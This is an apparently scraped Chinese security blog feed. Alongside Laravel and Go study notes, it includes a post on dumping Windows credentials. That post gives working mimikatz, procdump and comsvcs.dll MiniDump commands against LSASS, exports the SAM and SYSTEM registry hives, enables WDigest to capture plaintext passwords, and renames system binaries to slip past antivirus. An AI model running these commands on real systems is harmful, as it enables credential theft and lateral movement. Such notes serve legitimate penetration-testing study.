依赖模块</span><br></pre></td></tr></table></figure><h3 id="数据库配置"><a href="#数据库配置" class="headerlink" title="数据库配置"></a>数据库配置</h3><p>.env</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DB_CONNECTION&#x3D;mysql</span><br><span class="line">DB_HOST&#x3D;127.0.0.1</span><br><span class="line">DB_PORT&#x3D;3306</span><br><span class="line">DB_DATABASE&#x3D;laravel    数据库名</span><br><span class="line">DB_USERNAME&#x3D;root       数据库账户</span><br><span class="line">DB_PASSWORD&#x3D;XXXX       数据库密码</span><br></pre></td></tr></table></figure><p>/config—&gt;database.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#39;mysql&#39; &#x3D;&gt; [</span><br><span class="line">    &#39;driver&#39; &#x3D;&gt; &#39;mysql&#39;,</span><br><span class="line">    &#39;url&#39; &#x3D;&gt; env(&#39;DATABASE_URL&#39;),</span><br><span class="line">    &#39;host&#39; &#x3D;&gt; env(&#39;DB_HOST&#39;, &#39;127.0.0.1&#39;),</span><br><span class="line">    &#39;port&#39; &#x3D;&gt; env(&#39;DB_PORT&#39;, &#39;3306&#39;),</span><br><span class="line">    &#39;database&#39; &#x3D;&gt; env(&#39;DB_DATABASE&#39;, &#39;laravel&#39;),</span><br><span class="line">    &#39;username&#39; &#x3D;&gt; env(&#39;DB_USERNAME&#39;, &#39;root&#39;),</span><br><span class="line">    &#39;password&#39; &#x3D;&gt; env(&#39;DB_PASSWORD&#39;, &#39;XXXX&#39;),</span><br><span class="line">    &#39;unix_socket&#39; &#x3D;&gt; env(&#39;DB_SOCKET&#39;, &#39;&#39;),</span><br><span class="line">    &#39;charset&#39; &#x3D;&gt; &#39;utf8mb4&#39;,</span><br><span class="line">    &#39;collation&#39; &#x3D;&gt; &#39;utf8mb4_unicode_ci&#39;,</span><br></pre></td></tr></table></figure><h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><h3 id="基础路由"><a href="#基础路由" class="headerlink" title="基础路由"></a>基础路由</h3><p>routes文件下进行</p><ul><li>基本用法</li></ul><p>routes/web.php添加，  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Route::get(<span class="string">&#x27;test&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello Laravel&quot;</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p> url/test    ，进行访问</p><p>​    <img src="/2022/04/04/Laravel/image-20220405002141084.png" alt="image-20220405002141084"></p><p>另外一种用法,利用闭包函数，（例如视图文件），</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Route::get(<span class="string">&#x27;/we&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> view(<span class="string">&#x27;welcome&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>视图文件在resouces/views/中welcome.blade.php</p><p><img src="/2022/04/04/Laravel/image-20220405003140886.png" alt="image-20220405003140886"></p><p>访问(<a href="http://127.0.0.1:10001/we">http://127.0.0.1:10001/we</a>)</p><p><img src="/2022/04/04/Laravel/image-20220405003209479.png" alt="image-20220405003209479"></p><p>还有更多的路由请求方式就不在叙述了（<a href="https://laravelacademy.org/post/21970%EF%BC%89%E6%AF%95%E7%AB%9F%E6%88%91%E4%B8%8D%E6%98%AF%E5%BC%80%E5%8F%91%E5%95%8A">https://laravelacademy.org/post/21970）毕竟我不是开发啊</a> </p><ul><li>在api.php下定义的路由需要加上/api/</li></ul><p><img src="/2022/04/04/Laravel/image-20220405003738965.png" alt="image-20220405003738965"></p><p><a href="http://127.0.0.1:10001/api/testapi">http://127.0.0.1:10001/api/testapi</a></p><p><img src="/2022/04/04/Laravel/image-20220405003809337.png" alt="image-20220405003809337"></p><p>等等等</p><h3 id="laravel8-的路由用法的变化"><a href="#laravel8-的路由用法的变化" class="headerlink" title="laravel8 的路由用法的变化"></a>laravel8 的路由用法的变化</h3><p>laravel7等Laravel旧版本中，RouteServiceProvider类中包含$namespace属性，值为AppHttpControllers，此属性可自动为路由添加AppHttpControllers前缀。</p><p>即直接进行下面方式路由配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Route::get(&#39;login&#39;, &#39;LoginControl@index&#39;);</span><br></pre></td></tr></table></figure><p>laravel8.x 中该属性值默认为null，路由中只能使用标准PHP调用语法（需填写controller全路径）</p><p><img src="/2022/04/04/Laravel/image-20220405001507199.png" alt="image-20220405001507199"></p><p>方法1：取消<code>protected $namespace = &#39;App\\Http\\Controllers&#39;;</code>注释</p><p>方法2：在进行下面路由配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use App\Http\Controllers\LoginControl;      </span><br><span class="line"></span><br><span class="line">Route::get(&#39;login&#39;, [LoginControl::class, &#39;index&#39;]);</span><br></pre></td></tr></table></figure><h3 id="创建新控制器文件"><a href="#创建新控制器文件" class="headerlink" title="创建新控制器文件"></a>创建新控制器文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php artisan make:controller  LoginController</span><br></pre></td></tr></table></figure><h3 id="简单实例应用路由调用控制器"><a href="#简单实例应用路由调用控制器" class="headerlink" title="简单实例应用路由调用控制器"></a>简单实例应用路由调用控制器</h3><ul><li></li></ul><p>这边不知道为啥环境有问题，，，，一直报错。</p><p>参考:</p><p><a href="https://cloud.tencent.com/developer/article/1723191">https://cloud.tencent.com/developer/article/1723191</a>      Laravel框架分析</p><p><a href="https://mp.weixin.qq.com/s/aFGw2fPgjoSTD6zK_j-oHA">https://mp.weixin.qq.com/s/aFGw2fPgjoSTD6zK_j-oHA</a>    零基础学习laravel8 </p><p><a href="https://blog.csdn.net/wjcms/article/details/109016643">https://blog.csdn.net/wjcms/article/details/109016643</a>   laravel8更新之路由调整</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;Laravel 是一个 Web应用框架，php作为底层语言，能够有很好的扩展，拥有比较完善的软件包。&lt;/p&gt;
&lt;p&gt;3大核心：路由，控制器，视图&lt;/p&gt;
&lt;p&gt;中文官方：&lt;strong&gt;&lt;a href=&quot;https://learnku.com/docs/laravel/8.x&quot;&gt;https://learnku.com/docs/laravel/8.x&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="php" scheme="http://example.com/categories/php/"/>
    
    
    <category term="Laravel框架学习" scheme="http://example.com/tags/Laravel%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>内网抓hash/密码</title>
    <link href="http://example.com/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/"/>
    <id>http://example.com/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/</id>
    <published>2022-03-25T06:36:30.000Z</published>
    <updated>2022-04-20T15:00:42.293Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在winserver2012以后，windows保存的不是明文密码，只会保持密码的hash值</p><p>本地用户hash保存在SAM数据库中，域内用户密码hash保存在NTDS.dit文件中</p><p>常见格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0:::</span><br></pre></td></tr></table></figure><p>AAD3B435B51404EEAAD3B435B51404EE是<code>LM hash</code>   这个是之前认证使用的，现在已经不使用了</p><p>31D6CFE0D16AE931B73C59D7E0C089C0是<code>NTLM hash</code></p><p>在<code>域环境</code>中，机器认证是利用kerberos协议，在内网渗透中，域环境中拿到普通域用户/域管 hash，可以尝试pth。</p><p>在<code>工作组</code>环境中如果两台机器如果本地administrator账号密码一样也可能可以pth。</p> <a id="more"></a><p> 域环境中如果两台机器如果本地administrator账号密码一样也可能可以pth，所以这就体现<code>LAPS</code>方案重要性。</p><p>LAPS：Local Administrator Password Solution是<strong>本地管理员密码</strong>解决方案</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">安装</span><br><span class="line">powershell Get-ADComputer computername -Properties ms-Mcs-AdmPwd | select name, ms-Mcs-AdmPwd</span><br><span class="line"></span><br><span class="line">如果安装可在软件列表中发现 Local Administrator Password Solution</span><br></pre></td></tr></table></figure><p>LAPS允许您在<code>加入域</code>的情况下管理<code>本地管理员密码</code>（<code>随机</code>，唯一且定期更改）电脑。如果计算机未加入域，则将无法使用LAPS。这些密码集中存储在Active Directory中，并且仅限使用ACL的授权用户使用。使用Kerberos v5和AES从客户端到服务器的传输密码受到保护。</p><p>这个功能实现的是让加域的客户端本地administrator账号密码随机化（每一台都不一样的复杂随机密码），并且随机化密码存储在AD上可以查询到，避免***者猜出一台就等于猜出一片，从客户端到服务器的传输过程采用Kerberos v5和AES保护</p><h1 id="LSASS"><a href="#LSASS" class="headerlink" title="LSASS"></a>LSASS</h1><p>lsass进程内存中存储大量敏感信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">encrypted passwords</span><br><span class="line">NT hashes</span><br><span class="line">LM hashes</span><br><span class="line">Kerberos tickets</span><br></pre></td></tr></table></figure><p>通过LSASS转储来进行权限提升，数据窃取和横向移动等。</p><h1 id="1-mimikatz"><a href="#1-mimikatz" class="headerlink" title="1. mimikatz"></a>1. mimikatz</h1><p>需要<code>管理员权限</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; log.txt </span><br></pre></td></tr></table></figure><p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220325161740275.png" alt="image-20220325161740275"></p><p>可分为两步：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug             提升权限</span><br><span class="line">sekurlsa::logonpasswords     抓密码</span><br></pre></td></tr></table></figure><h1 id="2-各种dump-mimikatz"><a href="#2-各种dump-mimikatz" class="headerlink" title="2. 各种dump+mimikatz"></a>2. 各种dump+mimikatz</h1><h3 id="procdump"><a href="#procdump" class="headerlink" title="procdump"></a>procdump</h3><p>(官方软件)</p><p>有杀软的情况procdump不会被杀，但产生的lsass.dmp会可能被清除 （wdf下面会），我感觉应该在wdf白名单路径下进行转储</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp   #然后将lsass.dmp下载到本地</span><br><span class="line"></span><br><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">procdump64.exe -accepteula -ma [lsass.exe的PID] lsass.dmp</span><br><span class="line">(mimikatz.exe &quot;sekurlsa::minidump dump path &quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot;)</span><br></pre></td></tr></table></figure><p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220325150155475.png" alt="image-20220325150155475"></p><h3 id="rundll32-exe"><a href="#rundll32-exe" class="headerlink" title="rundll32.exe"></a>rundll32.exe</h3><p>有这个就 够了</p><p>(Windows自带C:\WINDOWS\System32\rundll32.exe)     原理是通过<code>API MiniDumpWriteDump</code>，利用<code>comsvcs.dll</code>导出 函数 minidump 进行dump内存</p><p>条件：<code>开启SeDebugPrivilege权限</code> （管理员cmd下改权限 一般情况是Disabled状态，powershell下默认开启）</p><p> powershell/cmd下运行comsvcs.dll 的MiniDump 来dump</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\lsass.dmp full</span><br></pre></td></tr></table></figure><p>但要绕过AMSI</p><p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220325172436533-16484821151331.png" alt="image-20220325172436533"></p><h5 id="如何绕过杀软"><a href="#如何绕过杀软" class="headerlink" title="如何绕过杀软"></a>如何绕过杀软</h5><p>cmd下  执行火绒，360，wdf  都报毒，并且还可能没有权限</p><p>powershell下  火绒不报， 360报， wdf 的amsi直接拦截</p><h5 id="绕360和wdf"><a href="#绕360和wdf" class="headerlink" title="绕360和wdf"></a>绕360和wdf</h5><p>参考下面文章，但是2022.3.30这种方法不能绕了，，<br>(<a href="https://mp.weixin.qq.com/s/IA42D6hjvk4Bld65Wahuag">https://mp.weixin.qq.com/s/IA42D6hjvk4Bld65Wahuag</a>)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy C:\windows\System32\comsvcs.dll bypass360.dll</span><br><span class="line"></span><br><span class="line">rundll32.exe bypass360.dll, MiniDump pid lsass.dmp full    </span><br></pre></td></tr></table></figure><p>2022.3.30后来我又想到了，copy  rundll32.exe  命名为1.exe ，直接就绕过了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd  C:\WINDOWS\System32</span><br><span class="line"></span><br><span class="line">copy C:\windows\System32\comsvcs.dll bypass360.dll</span><br><span class="line">copy C:\WINDOWS\System32\rundll32.exe 1.exe</span><br><span class="line"></span><br><span class="line">1.exe bypass360.dll, MiniDump pid lsass.dmp full</span><br></pre></td></tr></table></figure><p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220330172101684.png" alt="image-20220330172101684"></p><p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220330172955506.png" alt="image-20220330172955506"></p><ul><li>方法肯定很多，这个要分析杀软是怎么进行检测，然后进行对抗绕过。 呜呜呜真的不会其他的</li></ul><h3 id="AvDump"><a href="#AvDump" class="headerlink" title="AvDump"></a>AvDump</h3><p>我没有搞成功。。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AvDump.exe --pid &lt;lsass pid&gt; --exception_ptr 0 --thread_id 0 --dump_level 1 --dump_file C:\Users\admin\Desktop\lsass.dmp --min_interval 0</span><br></pre></td></tr></table></figure><h3 id="SqlDumper"><a href="#SqlDumper" class="headerlink" title="SqlDumper"></a>SqlDumper</h3><p>在sqlserver安装路径为：\Program Files\Microsoft SQL Server\90\Shared\SQLDumper.exe</p><p>单独安装需要MSVRC100.dll  （[<a href="https://www.microsoft.com/zh-cn/download/confirmation.aspx?id=26999)%EF%BC%89">https://www.microsoft.com/zh-cn/download/confirmation.aspx?id=26999)）</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sqldumper.exe &lt;ProcessID&gt; 0 0x01100    完整转储</span><br></pre></td></tr></table></figure><p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220330155608001.png" alt="image-20220330155608001"></p><h3 id="DumpMinitool-exe"><a href="#DumpMinitool-exe" class="headerlink" title="DumpMinitool.exe"></a>DumpMinitool.exe</h3><ul><li>过360，wdf  ，自带微软签名，需要vs2022自带的</li></ul><p>参考：<a href="https://twitter.com/mrd0x/status/1511415432888131586/photo/1">https://twitter.com/mrd0x/status/1511415432888131586/photo/1</a></p><p>有写winserver不带这个程序，这点比较限制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C：\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\Extensions\TestPlatform\Extensions</span><br></pre></td></tr></table></figure><p>DumpMinitool.exe   </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DumpMinitool.exe   --file  c:\dump.txt  --proccessId xxxx --dumpType Full</span><br></pre></td></tr></table></figure><h1 id="3-Out-MiniDump"><a href="#3-Out-MiniDump" class="headerlink" title="3. Out-MiniDump"></a>3. Out-MiniDump</h1><p>Out-MiniDump.ps1 wdf直接杀，环境win10下Import-Module 不能执行，可能win server能用吧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Module Out-MiniDump  </span><br><span class="line"></span><br><span class="line">Get-Process lsass | Out-Minidump   </span><br></pre></td></tr></table></figure><p>没有成功就不截图了</p><h1 id="4-导出本地SAM-mimikatz"><a href="#4-导出本地SAM-mimikatz" class="headerlink" title="4. 导出本地SAM+mimikatz"></a>4. 导出本地SAM+mimikatz</h1><p>导出本地sam数据库数据，（这个只能获得所有<code>本地用户</code>hash）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM SYSTEM</span><br><span class="line">reg save HKLM\SAM SAM </span><br></pre></td></tr></table></figure><p>mimikatz读取即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::sam &#x2F;sam:SAM &#x2F;system:SYSTEM exit&quot;</span><br></pre></td></tr></table></figure><p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220325171109114.png" alt="image-20220325171109114"></p><p>方法还有更多，杀软也多种多样，慢慢学习吧</p><p>参考：</p><p>一些获取Windows明文凭据的方法 | Loong716]：<a href="https://loong716.top/posts/lsass/">https://loong716.top/posts/lsass/</a></p><p><a href="https://redcanary.com/threat-detection-report/techniques/lsass-memory/">LSASS 内存 - 威胁检测报告 - 红色金丝雀 (redcanary.com)</a></p><h1 id="tips"><a href="#tips" class="headerlink" title="tips:"></a>tips:</h1><ol><li>winserver2012以后只能抓到用户hash，抓不到明文，但可以通过修改注册表**<code>开启Wdigest Auth</code>**，</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</span><br></pre></td></tr></table></figure><p>然后cmd执行<code>强制锁屏</code>（rundll32 user32.dll,LockWorkStation），等待管理员重新登陆在抓。</p><ol start="2"><li>hashcat 爆破ntlm hash，有可能拿到明文。</li><li>md5解密ntml hash 比较简单的可以解出</li><li>一些工具要做对应的免杀测试吧。</li></ol><p>记录下几篇文章：</p><p>利用脚本工具进行无文件LSASS dump凭据转储</p><p><a href="https://s3cur3th1ssh1t.github.io/Reflective-Dump-Tools/">https://s3cur3th1ssh1t.github.io/Reflective-Dump-Tools/</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;在winserver2012以后，windows保存的不是明文密码，只会保持密码的hash值&lt;/p&gt;
&lt;p&gt;本地用户hash保存在SAM数据库中，域内用户密码hash保存在NTDS.dit文件中&lt;/p&gt;
&lt;p&gt;常见格式：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0:::&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;AAD3B435B51404EEAAD3B435B51404EE是&lt;code&gt;LM hash&lt;/code&gt;   这个是之前认证使用的，现在已经不使用了&lt;/p&gt;
&lt;p&gt;31D6CFE0D16AE931B73C59D7E0C089C0是&lt;code&gt;NTLM hash&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在&lt;code&gt;域环境&lt;/code&gt;中，机器认证是利用kerberos协议，在内网渗透中，域环境中拿到普通域用户/域管 hash，可以尝试pth。&lt;/p&gt;
&lt;p&gt;在&lt;code&gt;工作组&lt;/code&gt;环境中如果两台机器如果本地administrator账号密码一样也可能可以pth。&lt;/p&gt;</summary>
    
    
    
    <category term="内网" scheme="http://example.com/categories/%E5%86%85%E7%BD%91/"/>
    
    
    <category term="内网抓hash/密码" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%8A%93hash-%E5%AF%86%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>Go</title>
    <link href="http://example.com/2022/03/21/Go/"/>
    <id>http://example.com/2022/03/21/Go/</id>
    <published>2022-03-21T07:39:14.000Z</published>
    <updated>2022-03-27T06:27:47.288Z</updated>
    
    <content type="html"><![CDATA[<p>Go 语言被设计成一门应用于搭载 Web 服务器，存储集群或类似用途的巨型中央服务器的系统编程语言。</p><h3 id="目的："><a href="#目的：" class="headerlink" title="目的："></a>目的：</h3><p>学习go写脚本和 免杀（其他大佬的有些免杀也是用go写的，效果不错，也算是为了能看懂代码吧）</p><p>go 没有类，有结构体，有指针，（主要是利用函数）。</p><a id="more"></a><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><p><strong>go build</strong>生成二进制文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go build xxx.go</span><br></pre></td></tr></table></figure><p>结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">包声明   package</span><br><span class="line">引入包   import (&quot;&quot; &quot;&quot; &quot;&quot; &quot;xx&#x2F;xxx&quot;)</span><br><span class="line">函数     func function_name( [parameter list] ) [return_types] &#123;  函数体 &#125;</span><br><span class="line">变量     var xxx&#x3D;&quot;str&quot;  </span><br><span class="line">常量     const</span><br><span class="line">语句 &amp; 表达式  </span><br><span class="line">注释      </span><br></pre></td></tr></table></figure><!--more--><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main  定义了包名</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span>  调用 fmt 包</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;菜鸟教程&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;hello go&quot;</span> + <span class="string">&quot;good&quot;</span>,<span class="string">&quot;good&quot;</span>)</span><br><span class="line"></span><br><span class="line">test()</span><br><span class="line"><span class="keyword">var</span> age <span class="keyword">int</span></span><br><span class="line">age = <span class="number">11</span></span><br><span class="line">fmt.Println(age)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="golang包"><a href="#golang包" class="headerlink" title="golang包"></a>golang包</h3><p>包用来区分命名空间，一般一个文件夹一个包，package “name” 声明包，文件夹与包名一样，一个文件夹下只有一个包。</p><ul><li>创建包</li></ul><p>例如src 文件夹下新建test文件 ，新建 test1.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span>  <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">xxxx</span><span class="params">()</span></span>&#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>导入包</li></ul><p>利用go module（1.11开始使用） 管理包依赖</p><ol><li>初始化模块</li></ol><p>go mod init  &lt;项目名称&gt;</p><ol start="2"><li>依赖关系处理，通过go.mod文件</li></ol><p>go mod tidy</p><ol start="3"><li>将依赖包复制到项目到 xxx目录</li></ol><p>go mod  xxx</p><p>如果包被屏蔽(墙),可以使用这个命令，随后使用go build -mod=xxxx编译</p><ol start="4"><li>显示依赖关系</li></ol><p>go list -m all</p><p>go list -m -json all (详细显示)</p><ol start="5"><li>下载依赖</li></ol><p>go  mod  download [path@version]</p><p>学习：<a href="https://www.runoob.com/go">https://www.runoob.com/go</a></p><p><a href="https://github.com/Leslie1sMe/golang">Leslie1sMe/golang: Golang的实战项目，学习笔记，代码例程汇总。 (github.com)</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Go 语言被设计成一门应用于搭载 Web 服务器，存储集群或类似用途的巨型中央服务器的系统编程语言。&lt;/p&gt;
&lt;h3 id=&quot;目的：&quot;&gt;&lt;a href=&quot;#目的：&quot; class=&quot;headerlink&quot; title=&quot;目的：&quot;&gt;&lt;/a&gt;目的：&lt;/h3&gt;&lt;p&gt;学习go写脚本和 免杀（其他大佬的有些免杀也是用go写的，效果不错，也算是为了能看懂代码吧）&lt;/p&gt;
&lt;p&gt;go 没有类，有结构体，有指针，（主要是利用函数）。&lt;/p&gt;</summary>
    
    
    
    <category term="Go" scheme="http://example.com/categories/Go/"/>
    
    
    <category term="Go学习" scheme="http://example.com/tags/Go%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>middleware</title>
    <link href="http://example.com/2022/03/20/middleware-java/"/>
    <id>http://example.com/2022/03/20/middleware-java/</id>
    <published>2022-03-20T11:11:10.000Z</published>
    <updated>2022-04-16T03:27:14.760Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h1><p>默认端口：<code>7001</code></p><p>部分历史漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. 弱口令&#x2F;任意文件读取+后台war包&#x2F;任意文件上传getshell</span><br><span class="line">2. CVE-2017-20271</span><br><span class="line">3. CVE-2018-2628</span><br><span class="line">4. CVE-2019-2725</span><br><span class="line">5. CVE-2020-2555</span><br><span class="line">6. CVE-2021-2394</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>WebLogic是<a href="https://baike.baidu.com/item/%E7%BE%8E%E5%9B%BDOracle%E5%85%AC%E5%8F%B8/9952086">美国Oracle公司</a>出品的一个application server，确切的说是一个基于<a href="https://baike.baidu.com/item/JAVAEE/3066623">JAVAEE</a>架构的<a href="https://baike.baidu.com/item/%E4%B8%AD%E9%97%B4%E4%BB%B6/452240">中间件</a>，WebLogic是用于<a 